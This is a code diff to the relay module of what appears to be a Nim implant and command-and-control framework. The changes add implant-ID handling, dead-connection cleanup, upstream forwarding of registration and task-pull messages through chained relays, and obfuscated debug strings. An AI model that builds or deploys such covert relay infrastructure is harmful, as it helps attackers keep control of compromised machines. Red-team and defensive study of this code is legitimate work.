@@ -7,6 +7,9 @@ const
     MAX_MESSAGE_SIZE* = 1024 * 1024  # 1MB max message size - prevents memory exhaustion
     HEADER_SIZE = 4  # 4 bytes for message length
 
+# Global relay connection state - shared between modules
+var isConnectedToRelay* = false
+
 type
     RelayConnection* = object
         socket*: Socket
@@ -24,13 +27,53 @@ type
         clientRegistry*: Table[string, int]  # ClientID → Connection index mapping
 
 # Forward declarations for routing functions
-proc getCurrentRelayID*(): string
 proc routeMessage*(server: var RelayServer, msg: RelayMessage): bool
 proc analyzeRoute*(route: seq[string], currentID: string): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int]
 proc isResponseMessage*(msgType: RelayMessageType): bool
 proc analyzeRouteDirection*(route: seq[string], currentID: string, isResponse: bool): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int, shouldRoute: bool]
 proc debugRouteDecision*(msg: RelayMessage, currentID: string)
 proc testDistributedRoutingSystem*(): tuple[passed: int, failed: int, details: seq[string]]
+
+# === ROUTING FUNCTIONS FOR PERSISTENT ROUTE MANAGEMENT ===
+
+# Get current relay/implant ID for route building with server state
+proc getCurrentRelayID*(server: RelayServer): string =
+    # CRITICAL FIX: Use consistent ID system for routing
+    # Check if we're running as a relay server
+    if server.isListening:
+        # For relay server: Use the implant ID registered with C2 (NOT internal relay ID)
+        let implantID = getCurrentImplantID()
+        if implantID != "":
+            when defined debug:
+                echo "[ID] 🆔 Relay Server using C2 registered ID: " & implantID
+            return implantID
+        else:
+            # Fallback for relay server without C2 registration
+            when defined debug:
+                echo "[ID] 🆔 Relay Server fallback to internal ID"
+            return generateImplantID("RELAY-SERVER")
+    else:
+        # For relay client: Use relay client ID
+        let clientID = getCurrentImplantID()
+        if clientID != "":
+            when defined debug:
+                echo "[ID] 🆔 Relay Client using ID: " & clientID
+            return clientID
+        else:
+            # Fallback for relay client
+            when defined debug:
+                echo "[ID] 🆔 Relay Client fallback to generated ID"
+            return generateImplantID("RELAY-CLIENT")
+
+# Backward compatibility: Get current relay/implant ID without server parameter
+proc getCurrentRelayID*(): string =
+    # Default implementation for backward compatibility
+    let implantID = getCurrentImplantID()
+    if implantID != "":
+        return implantID
+    
+    # Fallback: generate relay-specific ID
+    return generateImplantID("RELAY")
 
 # === FASE 4: REVERSE ROUTING FUNCTIONS ===
 
@@ -619,6 +662,41 @@ proc cleanupConnections*(server: var RelayServer) =
             echo obf("[CLEANUP] 🧹   ") & id & obf(" → connection ") & $idx
     
     for i, conn in server.connections:
+        # CRITICAL FIX: Validate connection is REALLY dead before cleanup
+        var connectionReallyDead = false
+        
+        if not conn.isConnected:
+            # Double-check: verify socket is actually closed
+            try:
+                if conn.socket != nil:
+                    let socketFd = conn.socket.getFd()
+                    if socketFd == osInvalidSocket:
+                        connectionReallyDead = true
+                        when defined debug:
+                            echo obf("[CLEANUP] ✅ Connection ") & $i & obf(" socket FD is invalid - confirmed DEAD")
+                    else:
+                        # Socket FD is valid but marked as not connected - TEST if still responsive
+                        var testBuffer = newString(1)
+                        let testResult = conn.socket.recv(testBuffer, 1)
+                        if testResult == 0:
+                            connectionReallyDead = true
+                            when defined debug:
+                                echo obf("[CLEANUP] ✅ Connection ") & $i & obf(" socket recv=0 - confirmed DEAD")
+                        else:
+                            # Socket is responsive - mark as connected again!
+                            server.connections[i].isConnected = true
+                            when defined debug:
+                                echo obf("[CLEANUP] 🔄 Connection ") & $i & obf(" REVIVED - was marked dead but socket is responsive!")
+                else:
+                    connectionReallyDead = true
+                    when defined debug:
+                        echo obf("[CLEANUP] ✅ Connection ") & $i & obf(" socket is nil - confirmed DEAD")
+            except:
+                connectionReallyDead = true
+                when defined debug:
+                    echo obf("[CLEANUP] ✅ Connection ") & $i & obf(" socket test failed - confirmed DEAD: ") & getCurrentExceptionMsg()
+        
+        # Keep connection if it's connected OR if we revived it
         if conn.isConnected:
             activeConnections.add(conn)
             # CRITICAL FIX: Only update registry if client is properly registered
@@ -628,7 +706,7 @@ proc cleanupConnections*(server: var RelayServer) =
                     echo obf("[CLEANUP] ✅ Remapped client ") & conn.clientID & obf(" from index ") & $i & obf(" to ") & $newIndex
                     echo obf("[CLEANUP] ✅ Client ID preserved: '") & conn.clientID & obf("' remains mapped to new index ") & $newIndex
             newIndex += 1
-        else:
+        elif connectionReallyDead:
             # CRITICAL FIX: Close socket before removing dead connection
             # This prevents file descriptor leaks
             try:
@@ -866,37 +944,67 @@ proc pollRelayServer*(server: var RelayServer, timeout: int = 100): seq[RelayMes
                                             echo "[ROUTING] 🚀 Payload length: " & $msg.payload.len
                                             echo "[ROUTING] 🚀 Connection index: " & $i
                                         
-                                        # Route the message - this handles forwarding and local processing
-                                        let routingSuccess = routeMessage(server, msg)
-                                        
-                                        if routingSuccess:
+                                        # CRITICAL FIX: Special handling for REGISTER, PULL, and CHAIN_INFO messages
+                                        if msg.msgType == REGISTER or msg.msgType == PULL or msg.msgType == CHAIN_INFO:
                                             when defined debug:
-                                                echo "[ROUTING] 🚀 ✅ Message routed successfully"
+                                                echo "[ROUTING] 🚀 📝 " & $msg.msgType & " message detected - applying special routing logic"
+                                                echo "[ROUTING] 🚀 📝 isConnectedToRelay: " & $isConnectedToRelay
                                             
-                                            # For local processing, add to result
-                                            # (Messages that are forwarded don't need to be in result)
-                                            let currentID = getCurrentRelayID()
-                                            let routeAnalysis = analyzeRoute(msg.route, currentID)
-                                            
-                                            when defined debug:
-                                                echo "[ROUTING] 🚀 Route analysis results:"
-                                                echo "[ROUTING] 🚀 - Current relay ID: " & currentID
-                                                echo "[ROUTING] 🚀 - Is for us: " & $routeAnalysis.isForUs
-                                                echo "[ROUTING] 🚀 - Next hop: " & routeAnalysis.nextHop
-                                                echo "[ROUTING] 🚀 - Hops from origin: " & $routeAnalysis.hopsFromOrigin
-                                            
-                                            if routeAnalysis.isForUs:
+                                            if isConnectedToRelay:
+                                                # INTERMEDIATE RELAY: Forward upstream toward primary relay
                                                 when defined debug:
-                                                    echo "[ROUTING] 🚀 🏠 Message is for local processing - adding to result"
+                                                    echo "[ROUTING] 🚀 📝 INTERMEDIATE RELAY: Forwarding " & $msg.msgType & " upstream"
+                                                
+                                                let routingSuccess = routeMessage(server, msg)
+                                                if routingSuccess:
+                                                    when defined debug:
+                                                        echo "[ROUTING] 🚀 📝 ✅ " & $msg.msgType & " forwarded upstream successfully"
+                                                else:
+                                                    when defined debug:
+                                                        echo "[ROUTING] 🚀 📝 ❌ " & $msg.msgType & " forward failed"
+                                            else:
+                                                # PRIMARY RELAY: Process locally (send to httpHandler)
+                                                when defined debug:
+                                                    echo "[ROUTING] 🚀 📝 PRIMARY RELAY: Processing " & $msg.msgType & " locally"
+                                                    echo "[ROUTING] 🚀 📝 Adding " & $msg.msgType & " to result for httpHandler"
+                                                
                                                 result.add(msg)
+                                        else:
+                                            # Regular message routing (non-REGISTER)
+                                            when defined debug:
+                                                echo "[ROUTING] 🚀 🔄 Regular message - using standard routing"
+                                            
+                                            # Route the message - this handles forwarding and local processing
+                                            let routingSuccess = routeMessage(server, msg)
+                                            
+                                            if routingSuccess:
+                                                when defined debug:
+                                                    echo "[ROUTING] 🚀 ✅ Message routed successfully"
+                                                
+                                                # For local processing, add to result
+                                                # (Messages that are forwarded don't need to be in result)
+                                                let currentID = getCurrentRelayID(server)
+                                                let routeAnalysis = analyzeRoute(msg.route, currentID)
+                                                
+                                                when defined debug:
+                                                    echo "[ROUTING] 🚀 Route analysis results:"
+                                                    echo "[ROUTING] 🚀 - Current relay ID: " & currentID
+                                                    echo "[ROUTING] 🚀 - Is for us: " & $routeAnalysis.isForUs
+                                                    echo "[ROUTING] 🚀 - Next hop: " & routeAnalysis.nextHop
+                                                    echo "[ROUTING] 🚀 - Hops from origin: " & $routeAnalysis.hopsFromOrigin
+                                                
+                                                if routeAnalysis.isForUs:
+                                                    when defined debug:
+                                                        echo "[ROUTING] 🚀 🏠 Message is for local processing - adding to result"
+                                                    result.add(msg)
+                                                else:
+                                                    when defined debug:
+                                                        echo "[ROUTING] 🚀 🔄 Message was forwarded - not adding to result"
                                             else:
                                                 when defined debug:
-                                                    echo "[ROUTING] 🚀 🔄 Message was forwarded - not adding to result"
-                                        else:
-                                            when defined debug:
-                                                echo "[ROUTING] 🚀 ❌ Message routing failed"
-                                            # For failed routing, still add to result for debugging
-                                            result.add(msg)
+                                                    echo "[ROUTING] 🚀 ❌ Message routing failed"
+                                                # For failed routing, still add to result for debugging
+                                                result.add(msg)
                                         
                                         when defined debug:
                                             echo "[ROUTING] 🚀 === END PROCESSING MESSAGE THROUGH ROUTING SYSTEM ==="
@@ -1018,18 +1126,6 @@ proc getConnectionStats*(server: RelayServer): tuple[listening: bool, connection
             result.connections += 1
             if conn.clientID != "":
                 result.registeredClients += 1
-
-# === ROUTING FUNCTIONS FOR PERSISTENT ROUTE MANAGEMENT ===
-
-# Get current relay/implant ID for route building
-proc getCurrentRelayID*(): string =
-    # Try to get ID from key config first
-    let implantID = getCurrentImplantID()
-    if implantID != "":
-        return implantID
-    
-    # Fallback: generate relay-specific ID
-    return generateImplantID("RELAY")
 
 # Determine if a client is a final destination (not another relay)
 proc isDestinationFinal*(server: RelayServer, clientID: string): bool =
@@ -1763,4 +1859,45 @@ proc initializeDistributedRoutingSystem*(implantID: string, sharedKey: string = 
     except:
         when defined debug:
             echo "[INIT] ❌ System initialization failed: " & getCurrentExceptionMsg()
-        return false 
+        return false
+
+# Update client ID in registry for confirmation protocol
+proc updateClientId*(server: var RelayServer, oldId: string, newId: string): bool =
+    when defined debug:
+        echo "[REGISTRY] 🔄 === UPDATE CLIENT ID ==="
+        echo "[REGISTRY] 🔄 Old ID: " & oldId
+        echo "[REGISTRY] 🔄 New ID: " & newId
+        echo "[REGISTRY] 🔄 Registry before: " & $server.clientRegistry.len & " clients"
+    
+    # Check if old ID exists in registry
+    if not server.clientRegistry.hasKey(oldId):
+        when defined debug:
+            echo "[REGISTRY] 🔄 ❌ Old ID not found in registry"
+            echo "[REGISTRY] 🔄 === END UPDATE CLIENT ID (NOT FOUND) ==="
+        return false
+    
+    # Check if new ID already exists (should not happen)
+    if server.clientRegistry.hasKey(newId):
+        when defined debug:
+            echo "[REGISTRY] 🔄 ⚠️ New ID already exists in registry - overwriting"
+    
+    # Get connection index from old ID
+    let connectionIndex = server.clientRegistry[oldId]
+    
+    # Update the connection's clientID
+    if connectionIndex < server.connections.len:
+        server.connections[connectionIndex].clientID = newId
+        when defined debug:
+            echo "[REGISTRY] 🔄 ✅ Updated connection " & $connectionIndex & " clientID to: " & newId
+    
+    # Update registry mapping
+    server.clientRegistry.del(oldId)
+    server.clientRegistry[newId] = connectionIndex
+    
+    when defined debug:
+        echo "[REGISTRY] 🔄 ✅ Registry updated successfully"
+        echo "[REGISTRY] 🔄 Registry after: " & $server.clientRegistry.len & " clients"
+        echo "[REGISTRY] 🔄 New mapping: " & newId & " → connection " & $connectionIndex
+        echo "[REGISTRY] 🔄 === END UPDATE CLIENT ID (SUCCESS) ==="
+    
+    return true 
